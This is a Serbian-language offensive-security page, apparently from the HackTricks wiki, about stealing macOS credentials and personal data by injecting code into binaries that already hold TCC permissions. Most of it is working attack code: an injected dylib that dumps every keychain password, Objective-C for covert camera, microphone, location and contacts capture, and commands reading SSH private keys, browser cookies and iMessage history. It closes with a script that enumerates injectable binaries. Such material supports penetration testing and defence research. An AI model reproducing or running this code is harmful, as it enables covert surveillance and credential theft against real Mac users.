# Krađa macOS akreditiva i podataka putem TCC dozvola

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

macOS TCC (Transparency, Consent, and Control) štiti pristup osetljivim korisničkim podacima. Kada napadač **kompromituje binarni fajl koji već ima TCC odobrenja**, preuzima te dozvole. Ova stranica opisuje potencijal za eksploataciju svake TCC dozvole povezane sa krađom podataka.<sup>[[2]](#references)</sup>

> [!WARNING]
> Ubrizgavanje koda u binarni fajl sa TCC odobrenjem (putem DYLD injection, dylib hijacking ili task port) **nečujno preuzima sve njegove TCC dozvole**. Nema dodatnog upita niti provere kada isti proces čita zaštićene podatke.<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### Nagrada

macOS Keychain čuva:
- **Wi-Fi lozinke** — sve sačuvane akreditive bežičnih mreža
- **Lozinke za website-ove** — Safari, Chrome (kada koristi Keychain) i lozinke drugih browsera
- **Lozinke aplikacija** — email nalozi, VPN akreditivi, development tokeni
- **Sertifikate i privatne ključeve** — code signing, client TLS, S/MIME enkripcija
- **Secure notes** — tajne koje je korisnik sačuvao

### Entitlement: `keychain-access-groups`

Keychain stavke su organizovane u **access groups**. `keychain-access-groups` entitlement aplikacije navodi kojim grupama može da pristupi:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Pristup kameri (kTCCServiceCamera)

### Eksploatacija

Binarna datoteka sa TCC odobrenjem za kameru (putem `kTCCServiceCamera` ili `com.apple.security.device.camera` entitlementa) može da snima fotografije i video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Tiho prikupljanje
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Počev od **macOS Sonoma**, indikator kamere na traci menija je stalno prikazan i nije ga moguće programski sakriti. Na **starijim verzijama macOS-a**, kratkotrajno snimanje možda neće proizvesti primetan indikator.

---

## Pristup mikrofonu (kTCCServiceMicrophone)

### Exploitation

Pristup mikrofonu snima sav zvuk sa ugrađenog mikrofona, headseta ili povezanih audio ulaznih uređaja:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Napad: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Praćenje lokacije (kTCCServiceLocation)

### Eksploatacija
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Kontinuirano praćenje
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakti / Kalendar / Fotografije

### Eksfiltracija ličnih podataka

| TCC Service | Framework | Podaci |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Imena, imejl adrese, telefoni, adrese |
| `kTCCServiceCalendar` | `EventKit` | Sastanci, učesnici, lokacije |
| `kTCCServicePhotos` | `Photos.framework` | Fotografije, snimci ekrana, metapodaci o lokaciji |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Prikupljanje kontakata
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Pristup iCloud nalogu

### Entitlement: `com.apple.private.icloud-account-access`

Ovaj entitlement omogućava komunikaciju sa `com.apple.iCloudHelper` XPC servisom, pružajući pristup:
- **iCloud tokenima** — autentikacionim tokenima za Apple ID korisnika
- **iCloud Drive-u** — sinhronizovanim dokumentima sa svih uređaja
- **iCloud Keychain-u** — lozinkama sinhronizovanim na svim Apple uređajima
- **Find My-u** — lokaciji svih Apple uređaja korisnika<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Kompromitovanje iCloud-entitled binarnog fajla proširuje napad sa **jednog uređaja na čitav Apple ekosistem**: druge Mac računare, iPhone, iPad i Apple Watch. iCloud Keychain sinhronizacija znači da su lozinke sa svih uređaja dostupne.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Najmoćnija TCC dozvola

Full Disk Access omogućava čitanje **svakog fajla na sistemu**, uključujući:
- Podatke drugih aplikacija (Messages, Mail, Safari istoriju)
- TCC baze podataka (otkrivajući sve druge dozvole)
- SSH ključeve i konfiguraciju
- Kolačiće pregledača i tokene sesije
- Baze podataka aplikacija i keš memorije
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrica prioriteta eksploatacije

Prilikom procene binarnih datoteka kojima se može injektovati kod i koje imaju TCC dozvole, dajte prioritet prema vrednosti podataka:

| Prioritet | TCC dozvola | Zašto |
|---|---|---|
| **Kritično** | Full Disk Access | Pristup svemu |
| **Kritično** | TCC Manager | Može dodeliti bilo koju dozvolu |
| **Visoko** | Keychain Access Groups | Sve sačuvane lozinke |
| **Visoko** | iCloud Account Access | Kompromitovanje više uređaja |
| **Visoko** | Input Monitoring (ListenEvent) | Keylogging |
| **Visoko** | Accessibility | GUI kontrola, samostalno dodeljivanje dozvole |
| **Srednje** | Screen Capture | Vizuelno prikupljanje podataka |
| **Srednje** | Camera + Microphone | Nadzor |
| **Srednje** | Contacts + Calendar | Podaci za Social engineering |
| **Nisko** | Location | Fizičko praćenje |
| **Nisko** | Photos | Lični podaci |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — „Šta se dešava na vašem Mac računaru, ostaje na Apple iCloud-u?!“ (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Iskorišćavanje TCC-a](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
